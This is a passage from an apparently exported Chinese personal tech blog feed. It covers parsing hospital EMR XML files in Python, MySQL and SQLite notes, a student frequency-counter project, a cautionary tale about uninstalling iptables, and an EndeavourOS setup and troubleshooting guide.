    <span class="token comment"># hpi_no_tag = regex.sub(remove_tag,'', hpi[0])</span>
    <span class="token comment"># if hpi_no_tag:</span>
    <span class="token comment">#     hpi_no_title_tag = regex.sub(r'主诉','',hpi_no_tag[0])</span>
    <span class="token comment">#     if hpi_no_title_tag:</span>
    <span class="token comment">#         text.append(hpi_no_title_tag[0])</span>
    <span class="token keyword">from</span> pyquery <span class="token keyword">import</span> PyQuery
    hpi_text <span class="token operator">=</span> PyQuery<span class="token punctuation">(</span>hpi<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> hpi_text<span class="token punctuation">.</span>text<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token comment"># clean the hpi compliant text</span>
        p1 <span class="token operator">=</span> <span class="token string">r'\n|:|：'</span>
        hpi_clean <span class="token operator">=</span> regex<span class="token punctuation">.</span>sub<span class="token punctuation">(</span>p1<span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>hpi_text<span class="token punctuation">.</span>text<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        hpi_cut <span class="token operator">=</span> regex<span class="token punctuation">.</span>sub<span class="token punctuation">(</span><span class="token string">'.*?(?=现病史)'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span>hpi_clean<span class="token punctuation">)</span>
        hpi_end <span class="token operator">=</span> regex<span class="token punctuation">.</span>sub<span class="token punctuation">(</span><span class="token string">'现病史'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span>hpi_cut<span class="token punctuation">)</span>
        text<span class="token punctuation">.</span>append<span class="token punctuation">(</span>hpi_end<span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    text<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'Null'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>后面5个病史都这样正则匹配很浪费时间，索性把这一大段全抽出来，直接全部去格式变为纯文本</p>
<pre class="line-numbers language-text" data-language="text"><code class="language-text">主诉颈部不适伴头痛、头晕2周，加重1周。现病史2周前患者因长期伏案工作后出现颈部不适伴头痛、头晕，转颈时头晕、头痛加重，休息后症状有所减轻，无伴双上肢放射痛及麻木感，无耳鸣，无视物旋转，无恶心呕吐，无踩棉花感，疼痛与天气变化无关，遂至“都江堰医院”就诊，检查头颅MRI未提示异常。近1周来，患者头晕、头痛加重，为求进一步系统治疗，遂入我科，门诊以“颈椎病”收入住院。入院症见步入病房，神清，精神可，颈部不适伴头痛、头晕，转颈时头晕、头痛加重，休息后症状有所减轻，无伴双上肢放射痛及麻木感，无耳鸣，无视物旋转，无恶心呕吐，无踩棉花感，纳眠可，二便调。既往史否认“糖尿病”、“高血压病”、“冠心病”等慢性病病史，否认“乙肝”、“结核”等传染病病史，否认重大手术史及外伤史。否认药物过敏史及食物过敏史，预防接种史不详。个人史生于四川阿坝长期居住于当地，否认疫区居住史，否认冶游史，否认吸烟、嗜酒等不良嗜好。月经及婚育史，患者自诉近期月经周期紊乱及月经量减少；适龄婚育，育有1女，家人均体健。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>然后根据主诉、现病史、既往史拆分每一部分</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 拉取现病史</span>
hpi <span class="token operator">=</span> regex<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">r'(?&lt;=现病史).*?(?=既往史)'</span>chiefandhistory_clean<span class="token punctuation">)</span>
<span class="token keyword">if</span> hpi<span class="token punctuation">:</span>
    text<span class="token punctuation">.</span>append<span class="token punctuation">(</span>hpi<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    text<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'Null'</span><span class="token punctuation">)</span>
<span class="token comment"># 拉取既往史</span>
item <span class="token operator">=</span> regex<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">r'(?&lt;=既往史).*?(?=个人史)'</span>chiefandhistory_clean<span class="token punctuation">)</span>
<span class="token keyword">if</span> item<span class="token punctuation">:</span>
    text<span class="token punctuation">.</span>append<span class="token punctuation">(</span>item<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    text<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'Null'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="批量读写文件">批量读写文件</h3>
<p>差不多能读了就把所有的病历批处理一下，这里用os.walk遍历所有xml文件（文件名是HIS标识+xml，不连续，就直接批量拉取了）</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># dir = "./Data1"</span>
<span class="token comment">#使用listdir循环遍历</span>
<span class="token keyword">def</span> <span class="token function">getxml</span><span class="token punctuation">(</span><span class="token builtin">dir</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">import</span> os
    path <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>isdir<span class="token punctuation">(</span><span class="token builtin">dir</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">dir</span><span class="token punctuation">)</span>
        path <span class="token operator">=</span> <span class="token builtin">dir</span>
    dirlist <span class="token operator">=</span> os<span class="token punctuation">.</span>walk<span class="token punctuation">(</span><span class="token builtin">dir</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> root<span class="token punctuation">,</span> dirs<span class="token punctuation">,</span> files <span class="token keyword">in</span> dirlist<span class="token punctuation">:</span>
        <span class="token keyword">for</span> <span class="token builtin">file</span> <span class="token keyword">in</span> files<span class="token punctuation">:</span>
            <span class="token keyword">if</span> <span class="token builtin">file</span><span class="token punctuation">.</span>endswith<span class="token punctuation">(</span><span class="token string">".xml"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                path<span class="token punctuation">.</span>append<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>root<span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"./XMLfilename.txt"</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
        <span class="token keyword">for</span> line <span class="token keyword">in</span> path<span class="token punctuation">:</span>
            f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>line<span class="token punctuation">)</span>
            f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> path<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="写入数据库">写入数据库</h2>
<p>最后是入库操作，这里为了省事直接用PyMySQL了</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pymysql
connection <span class="token operator">=</span> pymysql<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>host<span class="token operator">=</span>workstation_host<span class="token punctuation">,</span>
                             port<span class="token operator">=</span>workstation_port<span class="token punctuation">,</span>
                             user<span class="token operator">=</span><span class="token string">'root'</span><span class="token punctuation">,</span>
                             password<span class="token operator">=</span>workstation_passwd<span class="token punctuation">,</span>
                             db<span class="token operator">=</span><span class="token string">'EMR'</span><span class="token punctuation">,</span>
                             charset<span class="token operator">=</span><span class="token string">'utf8'</span><span class="token punctuation">)</span>
cursor <span class="token operator">=</span> connection<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>
cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">'INSERT INTO `medical_EHR` (`HIS`,`Chief_complaint`) VALUES (%s, %s)'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token builtin">list</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
connection<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="其他">其他</h2>
<p>一些大段的文本，比如主诉、病史之类的后期结构化用LSTM或者Bert跑一下，这个以后再讲。</p>
<p>现在这个电子病历吧，感觉跟纸币支付宝化一样，疯狂泄露隐私等问题根本没人管，指不定哪天你个人信息全给你卖了。 以后你们到医院还是能要纸质凭据就要纸质的，回头出了什么事找医院撕逼比较好办。另，现在医保吃紧，交了很多年医保到了用的时候大概率被赖账，别被坑了找医院讨说法还被打成医闹反动分子；什么？医生不都是弱势群体白衣天使咩？啊这，你说是那就是。</p>
<blockquote>
<p>三个劫道的不如一个卖药的,三个卖药的不如一个开学校的</p>
</blockquote>
]]></content>
      <categories>
        <category>102网吧日常</category>
      </categories>
      <tags>
        <tag>xml</tag>
        <tag>电子病历</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL从入门到跑路</title>
    <url>/45b9/</url>
    <content><![CDATA[<p>用了这么久数据库，现在还只会增删查改，开个坑学学优化。 <a id="more"></a> 等待填坑</p>
<p>这个图比较清晰</p>
<p><img src="/45b9/db.webp" /></p>
<p>看到clickhouse的速度很快，有空看一下</p>
<h2 id="轻如鸿毛的sqlite">轻如鸿毛的SQLite</h2>
<p>好东西，在性能严重受限的开发板上跑着非常舒服，反正以前我试着感觉比另一个嵌入式数据库BerkeleyDB感觉好用多了。</p>
<p>其实我感觉很多小网站什么的，根本没必要上MySQL之类的东西，SQLite完全够了。什么存储过程啊，什么访问控制用户权限管理啊，基本上不怎么能用得到。数据量也小，那就索性连索引都不要了。 没有那一堆臃肿的东西，也没有那一堆乱七八糟的依赖。</p>
<p>而且这个东西快啊，数据量不怎么大的情况下比MySQL快，配置也简单</p>
<h2 id="你们这个是什么教材啊你们真的是害人不浅啊你们这个教材">你们这个是什么教材啊，你们真的是害人不浅啊你们这个教材</h2>
<h3 id="一张大表不好吗">一张大表不好吗</h3>
<blockquote>
<p>范式，什么范式？</p>
</blockquote>
<p>课本上这个要新建一张表，那一张表，好多个表</p>
<h3 id="隔离性">隔离性</h3>
<p>clickhouse那么快的原因就是一定程度上破坏了隔离性</p>
<h3 id="原子性">原子性</h3>
<p>MySQL在5.7以后支持了json，或许是感受到了Postgres的压力。</p>
<h2 id="好用的干活工具">好用的干活工具</h2>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2RiY2xpL215Y2xp">mycli<i class="fa fa-external-link-alt"></i></span> MySQL的cli工具，能高亮和自动补全</p>
]]></content>
      <categories>
        <category>笔记&amp;札记</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
        <tag>Database</tag>
      </tags>
  </entry>
  <entry>
    <title>数字频率计</title>
    <url>/9824/</url>
    <content><![CDATA[<p>补档 <a id="more"></a> 泥电大三下的一门叫现代电子设计综合实验的实验课搞的数字频率计，拿VHDL和C51写的，工程文件扔在<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0FyY2hhZW9yYXB0b3IvbGF0Y2hfdGVzdA==">这里<i class="fa fa-external-link-alt"></i></span>了。这门课可能是你电为数不多不太水的实验课了，反正比手抄上万字的大物实验好多了（不知道现在还抄不抄了）</p>
<p>先分频，再把门控、数显、锁存和计数都写出来就能用了 精度问题其实要求不高，本来FPGA的板子上那些器件精度就不错，想要提高精度可以折腾一下等精度之类的做法 <div class="pdfobject-container" data-target="/uploads/频率计.pdf" data-height="500px"></div> 顺便试试博客插入PDF的功能（在火狐上偶尔有问题，好像是CORS跨域的问题）</p>
]]></content>
      <categories>
        <category>荒废的老本行</category>
      </categories>
      <tags>
        <tag>VHDL</tag>
        <tag>频率计</tag>
      </tags>
  </entry>
  <entry>
    <title>不要尝试sudo apt remove iptables</title>
    <url>/a7d1/</url>
    <content><![CDATA[<p><img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/emmm.jpg" alt="Picture" style="zoom:80%;" /> <a id="more"></a> 在Ubuntu和Debian里卸载iptables会发生严重的后果（大佬请无视） 一开始我们觉得是防火墙把443端口给办了用不了https，结果我用UFW设置不管用，怀疑是iptables的问题，问了花花师兄，也不清楚，我们决定先把iptables禁用了。随手一谷歌，也忘了哪个神仙说的</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">sudo</span> <span class="token function">apt</span> remove iptables <span class="token comment"># 不要乱试！</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>感觉对的嘛，卸个防火墙能出什么问题嘛<br />
然后提示是否卸载我选了y，然后突然在卸载的log发现一堆Docker，瞬间感觉不对劲。然后，然后Docker直接不能用了！ 血泪教训啊，防火墙卸了Docker就不能用了！</p>
<p>随手一搜发现不止我一个人中招啊</p>
<p><img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/iptables-docker.png" alt="Picture" style="zoom:80%;" /></p>
<p>我现在心中一万头草泥马飘过</p>
<p><img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/cnm.png" alt="Picture" style="zoom:80%;" /></p>
<p>行吧，一堆依赖比python2还多</p>
<p>不说了，准备重装系统了<img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/mmm.jpg" alt="Picture" style="zoom:80%;" /></p>
<hr />
<p>停用iptables请使用<code>chkconfig iptables off</code>命令</p>
<hr />
<p>更新，试图垂死挣扎使用</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">apt</span> <span class="token function">install</span> network-manager<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>既然把网卡配置删了那就再配置一遍 等会，装了NetworkManager选了默认配置之后连22端口也连不上了。。。 行吧，准备重装 <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/wa.jpg" alt="Picture" style="zoom:80%;" /></p>
]]></content>
      <categories>
        <category>102网吧日常</category>
      </categories>
      <tags>
        <tag>iptables</tag>
        <tag>删库跑路</tag>
        <tag>服务器</tag>
      </tags>
  </entry>
  <entry>
    <title>为什么不试试EndeavourOS呢</title>
    <url>/why-not-try-endeavouros/</url>
    <content><![CDATA[<p>sudo pacman -Rs win10</p>
<a id="more"></a>
<p>其实还是建议能折腾的玩家直接上原味Arch。不想装Arch的偷懒用户可以试试这个（不过推荐想用KDE等其他桌面的玩家先选择离线安装，然后卸载xfce的包，再装其他DE。这个在线安装的时候每装一个包都会 -Syu 一下，非常慢）</p>
<h2 id="镜像源">镜像源</h2>
<p>再次更新，你电镜像源有EndeavourOS了： <span class="exturl" data-url="aHR0cDovL21pcnJvcnMudWVzdGMuY24vZW5kZWF2b3Vyb3Mv">http://mirrors.uestc.cn/endeavouros/<i class="fa fa-external-link-alt"></i></span></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"Server = http://mirrors.tuna.tsinghua.edu.cn/endeavouros/repo/<span class="token variable">$repo</span>/<span class="token variable">$arch</span>"</span> <span class="token operator">></span> /etc/pacman.d/endeavouros-mirrorlist<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>iso镜像在<span class="exturl" data-url="aHR0cDovL21pcnJvcnMudWVzdGMuY24vZW5kZWF2b3Vyb3MvaXNvLw==">这里<i class="fa fa-external-link-alt"></i></span></p>
<p>清华已经安排上了EndeavourOS的镜像和<span class="exturl" data-url="aHR0cHM6Ly9taXJyb3JzLnR1bmEudHNpbmdodWEuZWR1LmNuL2VuZGVhdm91cm9zL2lzby8=">iso<i class="fa fa-external-link-alt"></i></span>，可以方便的下载iso和更新EndeavourOS的包了。（或者用PT种子下载，实测速度均&gt;10Mb/s）</p>
<p>更改<code>/etc/pacman.d/endeavouros-mirrorlist</code>中的内容，改为</p>
<pre class="line-numbers language-config" data-language="config"><code class="language-config">## China
Server &#x3D; https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;endeavouros&#x2F;repo&#x2F;$repo&#x2F;$arch<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>然后<code>sudo pacman -Syy</code>刷新一下</p>
<h2 id="安装virtualbox虚拟机">安装virtualbox虚拟机</h2>
<p>我用的kernel是lts版本（偶滴本本是Nvidia独显，不敢上kernel一直滚，怕炸）</p>
<p>装头文件、virtualbox组件、网络和vnc扩展（可选）</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> pacman -S linux-lts-headers virtualbox virtualbox-guest-iso virtualbox-host-dkms net-tools virtualbox-ext-vnc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>推荐安装oracle的增强扩展（一些自适应分辨率缩放、USB驱动什么的都在这里面）</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yay -S virtualbox-ext-oracle<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>然后下载镜像（微软貌似出了用于虚拟机的免费90天win10，然而win10还是耗资源，没有什么特殊需求就只是用用office用用QQ什么的开个win7甚至XP虚拟机就好了，在虚拟机里会流畅一点）</p>
<p>增强功能要在win虚拟机中手动安装扩展才能用</p>
<h2 id="终端配置">终端配置</h2>
<h3 id="将bashzsh的终端输出信息和日志改回英文">将bash/zsh的终端输出信息和日志改回英文</h3>
<p>终端有些报错和输出还是要靠英文去谷歌，中文资料太少了，查不到，但是又不想把全局设置成英文的。直接<code>export LANG=en_US.UTF-8</code>不起作用，改成<code>export LANG=en_US</code>变成了英文但是中文乱码了，差了一下LANGUAGE参数的优先级比LANG要高、LC_X参数优先级比LANGUAGE高，修改LANGUAGE变量即可。</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">LANGUAGE</span></span><span class="token operator">=</span><span class="token string">"en_US:UTF-8"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>只修改终端那就在.bashrc加上</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token environment constant">$TERM</span>"</span><span class="token operator">=</span><span class="token string">"linux"</span> <span class="token punctuation">]</span> <span class="token punctuation">;</span><span class="token keyword">then</span> 
<span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">LANGUAGE</span></span><span class="token operator">=</span>en_US 
<span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">LANG</span></span><span class="token operator">=</span>en_US.UTF-8 
<span class="token keyword">fi</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="默认终端改为zsh">默认终端改为zsh</h3>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">chsh -s /usr/bin/zsh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>装oh-my-zsh（因为我懒得自己配置zsh了）和插件，并设置默认终端为oh-my-zsh</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">yay -S <span class="token function">zsh</span> oh-my-zsh-git autojump zsh-autosuggestions zsh-syntax-highlighting
chsh -s /usr/bin/zsh
<span class="token function">cp</span> /usr/share/oh-my-zsh/zshrc ~/.zshrc <span class="token comment"># 我比较懒，就直接把默认配置拿过来改改</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h2 id="更换lts内核">更换lts内核</h2>
<p>更新到5.8以后我的virtualbox又出问题了，换回linux-lts</p>
<p>EndeavourOS有一个叫akm的图形界面，但是你要手动重装virtualbox之类的会受到内核影响的东西。</p>
<h2 id="显卡驱动">显卡驱动</h2>
<blockquote>
<p>so, nvidia f.....</p>
</blockquote>
<p>算了，3080那么强，不黑英伟达了(更新，AMD新卡出了，好家伙</p>
<p>他们从以前Antergos那fork了一个驱动安装脚本，有个包叫nvidia-installer（lts等用户请用nvidia-installer-dkms），看<span class="exturl" data-url="aHR0cHM6Ly9lbmRlYXZvdXJvcy5jb20vZG9jcy9oYXJkd2FyZS1hbmQtbmV0d29yay9ncmFwaGljLWNhcmRzLWdwdS1kcml2ZXItYW5kLXNldHVwLw==">这里<i class="fa fa-external-link-alt"></i></span>。</p>
<h2 id="桌面环境">桌面环境</h2>
<p>EndeavourOS官方魔改定制了xfce的主题和图标，离线安装镜像也只有xfce，其他的几乎没怎么魔改。</p>
<p>如果要装其他DE的话</p>
<p>紫红配色看个人喜好吧，其实我不太能欣赏的来（这个配色，Gitlab同款）</p>
<p>更新，KDE 的 5.20.2 配色和EndeavourOS完全一致，建议他们火速从XFCE迁往KDE（不是</p>
<figure>
<img src="/why-not-try-endeavouros/image-20201031190318540.png" alt="KDE新官网样子" /><figcaption aria-hidden="true">KDE新官网样子</figcaption>
</figure>
<p>多桌面环境可能出问题，非要这样做的话建议每个不同的桌面环境分配一个单独的用户名。 （貌似xfce4和KDE一起用几乎问题（用ssdm），先装ssdm和KDE,然后装xfce4） 尝试了一下i3wm, 简洁是真的简洁，不太习惯又删了换回KDE了。</p>
<p>KDE有一种 Windows Vista 的感觉，感觉是 linux 所有 Desktop Enviroment 里面最舒服的。xfce虽然是EndeavourOS默认的DE，但是xfce开发人手不够，用户和社区贡献者也比KDE少，而且内存占用最新的KDE已经比xfce低了.....现在xfce也不怎么轻量了，渣配置机器上表现没有LXDE好，感觉不少用户都转去用i3wm和KDE了...逐渐没落的夕阳DE，适合养老</p>
<h2 id="硬盘扩容和迁移">硬盘扩容和迁移</h2>
<p>趁打折买了一块西数SN550,之前只有500G还装了个双系统的笔记本可以扩容了</p>
<p>现在把/home分区（大概60G）从老硬盘移动到新硬盘上，空出来的60G给/目录。我既不是LVM也没有组raid，文件系统用的ext4，500G老硬盘分了400G给win10,剩下100G给了linux，分了一个/，40G,一个/home，60G</p>
<p>先格式化（这里我用的GPT分区表，ext4），然后挂载到/mnt,然后用rsync迁移/home下的文件到/mnt 然后umount，然后分区合并给/root，再挂载到/home下面</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">fdisk</span> -l
yay -Sy <span class="token function">rsync</span>

mkfs.ext4 /dev/nvme0n1p1
<span class="token function">mount</span> /dev/nvme0n1p1 /mnt
<span class="token function">rsync</span> -avz /home /mnt
<span class="token function">umount</span> dev//nvme0n1p1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>两边都是nvme,2分钟就同步完成了，速度非常感人，然后修改fstab，将原来/home分区的uuid改为新硬盘的（/dev/nvme0n1p1）uuid</p>
<p><code>/etc/fstab</code>大概长这个样子，分别是uuid,挂载目录，文件类型，noatime后面0表示不开机自检，/</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">UUID</span><span class="token operator">=</span><span class="token number">8205</span>-8BC5                            /boot/efi      vfat    <span class="token assign-left variable">umask</span><span class="token operator">=</span>0077 <span class="token number">0</span> <span class="token number">2</span>
<span class="token assign-left variable">UUID</span><span class="token operator">=</span><span class="token number">36499174</span>-6a4a-4b9d-b5cc-0b1f555a1f46 /              ext4    defaults,noatime <span class="token number">0</span> <span class="token number">1</span>
<span class="token assign-left variable">UUID</span><span class="token operator">=</span>bf5e768c-a2de-4618-9861-5946459a69b6 /home          ext4    defaults,noatime <span class="token number">0</span> <span class="token number">2</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>然后退出来，用livecd或者双系统的分区工具把原来的/home分区删掉分给原来的/目录。（注意做好备份不要删错了，删错了就没了）</p>
<p>再次登陆后应该就行了。弄完突然发现KDE自带一个叫KDE Partition Manager的工具，看起来貌似还行。</p>
<h2 id="修grub">修grub</h2>
<p>双系统grub又出问题了，好在用liveusb重装了一下grub问题救了回来。</p>
<p>我是UEFI，操作除了最后 grub install 用EndeavourOS的，其他的和Arch一样</p>
<p>先挂载，然后chroot进去，然后重装grub</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mount</span> /dev/nvme0n1p3 /mnt
<span class="token function">mount</span> /dev/nvme1n1p2 /mnt/boot/efi
<span class="token function">grub-mkconfig</span> -o /boot/grub/grub.cfg
grub-install --target<span class="token operator">=</span>x86_64-efi --efi-directory<span class="token operator">=</span>/boot/efi --bootloader-id<span class="token operator">=</span>EndeavourOS-grub<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="滚动升级">滚动升级</h2>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> pacman -Syu <span class="token comment"># 装了AUR就yay -Syu</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>如果要自动降级新软件包就<code>-Syuu</code>(不推荐)</p>
<p>升级的包里面有内核和显卡驱动的时候要注意小心</p>
<p>升级内核之后最好重启一下，有的时候不重启会遇到开bbr失败了啊，u盘读不出来了啊，就比如<span class="exturl" data-url="aHR0cHM6Ly9qbGljZS50b3AvcC83bDltby8=">记因内核版本错误导致U盘不能识别的问题解决<i class="fa fa-external-link-alt"></i></span>、<span class="exturl" data-url="aHR0cHM6Ly92MmV4LmNvbS90LzMyMzU1OQ==">这个v站帖子<i class="fa fa-external-link-alt"></i></span>还有重启后<span class="exturl" data-url="aHR0cHM6Ly9tYW5hdGVlbGF6eWNhdC5naXRodWIuaW8vbGludXgvMjAyMC8wMi8xNC9maXgtYXJjaC1ib290LWZhaWxlZC5odG1s">Grub内核版本号不升级<i class="fa fa-external-link-alt"></i></span>，大部分情况下<code>modprobe</code>找不到模块八成就是了</p>
<h3 id="升级内核不重启">升级内核不重启</h3>
<p>参考reddit这个<span class="exturl" data-url="aHR0cHM6Ly93d3cucmVkZGl0LmNvbS9yL2FyY2hsaW51eC9jb21tZW50cy80enJzYzMva2VlcF95b3VyX3N5c3RlbV9mdWxseV9mdW5jdGlvbmFsX2FmdGVyX2Ffa2VybmVsLw==">帖子<i class="fa fa-external-link-alt"></i></span></p>
<p>一个软链过去，感觉不太优雅，还是乖乖重启比较好</p>
<blockquote>
<p>看来包管理器们应该学习其他两个系统，统一在关机开机的时候更新软件。</p>
</blockquote>
<h2 id="kde使用事项">KDE使用事项</h2>
<h3 id="kde卡死的抢救方案">KDE卡死的抢救方案</h3>
<p>KDE现在已经比较稳定了，但是Linux桌面程序还是偶尔把桌面搞到卡死，比如vscode内存泄漏。</p>
<p>首先尝试<code>ctl+alt+t</code>呼出终端，如果不能就<code>ctl+alt+F2</code>调出tty，htop看一下那个进程占用高，kill掉，如果不行就重启tty</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">kquitapp5 plasmashell <span class="token operator">&amp;&amp;</span> kstart5 plasmashell<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>正常退出不行就直接killall</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">killall</span> plasmashell <span class="token operator">&amp;&amp;</span> kstart5 plasmashell<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>或者重启一下SDDM</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">systemctl restart sddm<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>还不行就杀掉tty1，然后重启xorg</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ps</span> aux <span class="token operator">|</span> <span class="token function">grep</span> tty1 <span class="token comment"># 或者pgrep tty1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>然后kill掉（或者直接<code>pkill -9 -t tty1</code>），重启 或者直接</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">pkill</span> x
startx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>再不行直接<code>reboot</code>就好了</p>
